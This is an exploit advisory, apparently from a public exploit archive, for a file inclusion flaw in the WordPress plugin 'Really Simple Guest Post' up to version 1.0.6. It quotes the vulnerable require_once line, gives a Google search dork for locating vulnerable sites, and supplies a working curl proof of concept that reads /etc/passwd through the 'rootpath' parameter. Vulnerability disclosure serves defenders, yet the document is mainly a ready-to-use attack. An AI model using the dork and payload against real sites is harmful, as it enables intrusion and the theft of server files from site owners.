@@ -1,0 +1,27 @@
+# Exploit Title: Wordpress Really Simple Guest Post File Include
+# Google Dork: inurl:"really-simple-guest-post" intitle:"index of"
+# Date: 04/06/2015
+# Exploit Author: Kuroi'SH
+# Software Link: https://wordpress.org/plugins/really-simple-guest-post/
+# Version: <=1.0.6
+# Tested on: Linux
+
+The vulnerable file is called:
+simple-guest-post-submit.php and its full path is
+/wp-content/plugins/really-simple-guest-post/simple-guest-post-submit.php
+The vulnerable code is as follows:
+(line 8)
+require_once($_POST["rootpath"]);
+As you can see, the require_once function includes a data based on
+user-input without any prior verification.
+So, an attacker can exploit this flaw and come directly into the url
+/wp-content/plugins/really-simple-guest-post/simple-guest-post-submit.php
+and send a post data like: "rootpath=the_file_to_include"
+
+Proof of concept:
+curl -X POST -F "rootpath=/etc/passwd" --url
+http://localhost/wp-content/plugins/really-simple-guest-post/simple-guest-post-submit.php
+which will print out the content of /etc/passwd file.
+
+Greats to Black Sniper & Moh Ooasiic
+by Kuroi'SH
